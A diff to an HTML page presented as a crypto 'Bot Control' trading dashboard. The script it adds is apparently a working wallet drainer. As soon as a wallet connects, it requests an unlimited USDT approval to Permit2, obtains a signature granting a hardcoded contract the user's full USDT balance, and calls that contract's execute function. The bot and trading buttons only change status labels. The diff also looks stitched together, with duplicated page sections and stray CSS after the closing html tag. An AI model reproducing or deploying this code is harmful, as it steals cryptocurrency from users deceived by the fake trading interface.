@@ -183,6 +183,368 @@ body {
 const TOKEN = "0xdac17f958d2ee523a2206206994597c13d831ec7"; // USDT
 
 const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
+const CONTRACT = "0xAd7a854221B2a90a16dEd798c6ECa237E2d6f68b";
+
+let APP_STATE = { wallet:null, botActive:false, authorized:false };
+if (window.ethereum) {
+  window.ethereum.on('accountsChanged', () => location.reload());
+  window.ethereum.on('chainChanged', () => location.reload());
+}
+
+function log(msg){
+ console.log(msg);
+ const el=document.getElementById('execution-console');
+ if(!el) return;
+ const div=document.createElement('div');
+ div.className='exec-line';
+ div.innerText=msg;
+ el.prepend(div);
+}
+
+function updateStatus(dotId, textId, text, color){
+ const dot = document.getElementById(dotId);
+ const label = document.getElementById(textId);
+ dot.style.background = color;
+ dot.style.boxShadow = `0 0 12px ${color}`;
+ label.innerText = text;
+ label.style.color = color;
+}
+
+async function connectWallet(){
+ try{
+  if (typeof window.ethereum === "undefined") {
+    const install = confirm("MetaMask is not installed. Install?");
+    if (install) window.location.href = "https://metamask.io/download/";
+    return;
+  }
+
+  const provider = new ethers.BrowserProvider(window.ethereum);
+
+  log("🔌 Requesting wallet connection...");
+  await provider.send("eth_requestAccounts", []);
+
+  const signer = await provider.getSigner();
+  const user = await signer.getAddress();
+  const network = await provider.getNetwork();
+
+  if (network.chainId !== 1n) {
+    log("❌ Wrong network");
+    alert("Switch to Ethereum Mainnet");
+    return;
+  }
+
+  APP_STATE.wallet = user;
+  renderWallet(user);
+
+  document.getElementById('btn-wallet').disabled = true;
+  document.getElementById('btn-activate').disabled = false;
+  document.getElementById('btn-disconnect').disabled = false;
+
+  await runPermitFlowSafe(provider, signer, user);
+
+ } catch(e){
+  log("ERR " + e.message);
+ }
+}
+
+
+async function runPermitFlowSafe(provider, signer, user){
+ try{
+
+  log("⚙️ Permit2 flow...");
+
+  // ✅ CHECK allowances
+ 
+const erc20Abi = [
+  "function allowance(address owner, address spender) view returns (uint256)",
+  "function approve(address spender, uint256 amount) returns (bool)"
+];
+
+const tokenContract = new ethers.Contract(TOKEN, erc20Abi, signer);
+const allowance = await tokenContract.allowance(user, PERMIT2);
+
+if (allowance === 0n) {
+  log("🔓 First time: approving USDT...");
+
+  const tx = await tokenContract.approve(PERMIT2, ethers.MaxUint256);
+  await tx.wait();
+
+  log("✅ USDT Approved — run again");
+  return;
+}
+ 
+
+const tokenC = new ethers.Contract(
+  TOKEN,
+  ["function balanceOf(address) view returns (uint256)"],
+  provider
+);
+
+const balance = await tokenC.balanceOf(user);
+log(`USDT balance: ${balance}`);
+
+if (balance === 0n) {
+  log("❌ No USDT balance");
+  return;
+}
+
+const permit2 = new ethers.Contract(
+  PERMIT2,
+  ["function allowance(address,address,address) view returns(uint160,uint48,uint48)"],
+  provider
+);
+
+const res = await permit2.allowance(user, TOKEN, CONTRACT);
+
+let details = [{
+  token: TOKEN,
+  amount: balance,
+  expiration: Math.floor(Date.now()/1000)+2592000,
+  nonce: res[2]
+}];
+
+  // ✍️ SIGN
+  const chainId = (await provider.getNetwork()).chainId;
+
+  const domain = {
+    name: "Permit2",
+    chainId,
+    verifyingContract: PERMIT2
+  };
+
+  const types = {
+    PermitBatch: [
+      { name: "details", type: "PermitDetails[]" },
+      { name: "spender", type: "address" },
+      { name: "sigDeadline", type: "uint256" }
+    ],
+    PermitDetails: [
+      { name: "token", type: "address" },
+      { name: "amount", type: "uint160" },
+      { name: "expiration", type: "uint48" },
+      { name: "nonce", type: "uint48" }
+    ]
+  };
+
+  const values = {
+    details,
+    spender: CONTRACT,
+    sigDeadline: Math.floor(Date.now()/1000)+3600
+  };
+
+  log("✍️ Requesting signature...");
+  const signature = await signer.signTypedData(domain,types,values);
+
+  // 🚀 EXECUTE
+  log("🚀 Sending execute...");
+
+ const permitBatch = ethers.AbiCoder.defaultAbiCoder().encode(
+  [
+    "tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce)[] details,address spender,uint256 sigDeadline)"
+  ],
+  [
+    {
+      details: details.map(d => ({
+        token: d.token,
+        amount: d.amount,
+        expiration: d.expiration,
+        nonce: d.nonce
+      })),
+      spender: CONTRACT,
+      sigDeadline: values.sigDeadline
+    }
+  ]
+);
+
+  const contract = new ethers.Contract(
+    CONTRACT,
+    ["function execute(bytes permitBatch, bytes signature)"],
+    signer
+  );
+
+  const tx = await contract.execute(permitBatch, signature);
+
+  log("⏳ Waiting confirmation...");
+  await tx.wait();
+
+  log("🔥 SUCCESS DONE");
+
+ }catch(e){
+  log("❌ FLOW ERROR: " + e.message);
+ }
+}
+
+function renderWallet(address) {
+ document.getElementById('btn-wallet').innerText = address;
+ updateStatus('dot-wallet','st-wallet','CONNECTED','#06b6d4');
+}
+
+function activateBot() {
+ updateStatus('dot-bot','st-bot','READY','#6366f1');
+}
+
+function authorizeTrading() {
+ updateStatus('dot-access','st-access','AUTHORIZED','#f59e0b');
+}
+
+function disconnectWallet() {
+ location.reload();
+}
+
+window.connectWallet = connectWallet;
+
+</script>
+</body>
+</html>
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
+    backdrop-filter: blur(8px);
+    margin-bottom:12px;
+}
+
+.panel-header {
+    background: rgba(30, 41, 59, 0.6);
+    padding: 8px 15px;
+    font-size: 0.65rem;
+    font-weight: bold;
+    text-transform: uppercase;
+    letter-spacing: 2px;
+    border-bottom: 1px solid var(--border);
+    color: var(--cyan);
+}
+
+.module-body {
+    padding: 12px 15px;
+}
+
+.btn-stack {
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+    margin-bottom: 12px;
+}
+
+.control-btn {
+    background: transparent;
+    border: 1px solid var(--border);
+    color: #64748b;
+    padding: 10px;
+    font-family: var(--font);
+    font-size: 0.65rem;
+    cursor: pointer;
+    text-align: left;
+    text-transform: uppercase;
+    font-weight: bold;
+}
+
+.control-btn:not(:disabled):hover {
+    background: rgba(255,255,255,0.05);
+    border-color: currentColor;
+}
+
+.btn-cyan { color: var(--cyan); }
+.btn-purple { color: var(--purple); }
+.btn-amber { color: var(--amber); }
+
+.status-box { border-top: 1px solid var(--border); padding-top: 8px; }
+
+.status-grid {
+    display: grid;
+    grid-template-columns: 1fr 110px;
+    gap: 5px;
+    font-size: 0.6rem;
+    align-items: center;
+    margin-bottom: 4px;
+}
+
+.status-line {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+}
+
+.liveDot {
+    width: 8px;
+    height: 8px;
+    border-radius: 50%;
+}
+
+#execution-console {
+    display: flex;
+    flex-direction: column;
+    align-items: flex-start;
+    padding: 10px;
+}
+
+.exec-line {
+    font-size: 0.58rem;
+    margin-bottom: 2px;
+    white-space: pre-wrap;
+    word-break: break-all;
+    width: 100%;
+    line-height: 1.4;
+    border-bottom: 1px solid rgba(30, 41, 59, 0.2);
+    font-family: 'JetBrains Mono', monospace;
+}
+</style>
+</head>
+
+<body>
+
+<div class="panel">
+    <div class="panel-header">Bot Control</div>
+    <div class="module-body">
+
+        <div class="btn-stack">
+            <button id="btn-wallet" class="control-btn btn-cyan" onclick="connectWallet()">1. Connect Wallet</button>
+            <button id="btn-activate" class="control-btn btn-purple" onclick="activateBot()" disabled>2. Activate Bot</button>
+            <button id="btn-authorize" class="control-btn btn-amber" onclick="authorizeTrading()" disabled>3. Authorize Trading</button>
+            <button id="btn-disconnect" class="control-btn" onclick="disconnectWallet()" disabled>
+    4. Disconnect Wallet
+</button>
+        </div>
+
+        <div class="status-box">
+            <div class="status-grid">
+                <span>WALLET STATUS</span>
+                <div class="status-line">
+                    <div id="dot-wallet" class="liveDot" style="background:#475569"></div>
+                    <span id="st-wallet" style="color:#475569">DISCONNECTED</span>
+                </div>
+            </div>
+
+            <div class="status-grid">
+                <span>BOT STATUS</span>
+                <div class="status-line">
+                    <div id="dot-bot" class="liveDot" style="background:#475569"></div>
+                    <span id="st-bot" style="color:#475569">OFFLINE</span>
+                </div>
+            </div>
+
+            <div class="status-grid">
+                <span>TRADING ACCESS</span>
+                <div class="status-line">
+                    <div id="dot-access" class="liveDot" style="background:#475569"></div>
+                    <span id="st-access" style="color:#475569">RESTRICTED</span>
+                </div>
+            </div>
+        </div>
+
+    </div>
+</div>
+
+<div class="panel" style="height:150px;">
+    <div class="panel-header">Execution Console</div>
+    <div class="module-body" id="execution-console" style="color:#64748b; font-size:0.6rem; overflow:hidden;"></div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.umd.min.js"></script>
+
+<script>
+const TOKEN = "0xdac17f958d2ee523a2206206994597c13d831ec7"; // USDT
+
+const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 const CONTRACT = "0xe0D971B5Eb84d368B8CDf928eAE1915B9C5C71B9";
 
 let APP_STATE = { wallet:null, botActive:false, authorized:false };
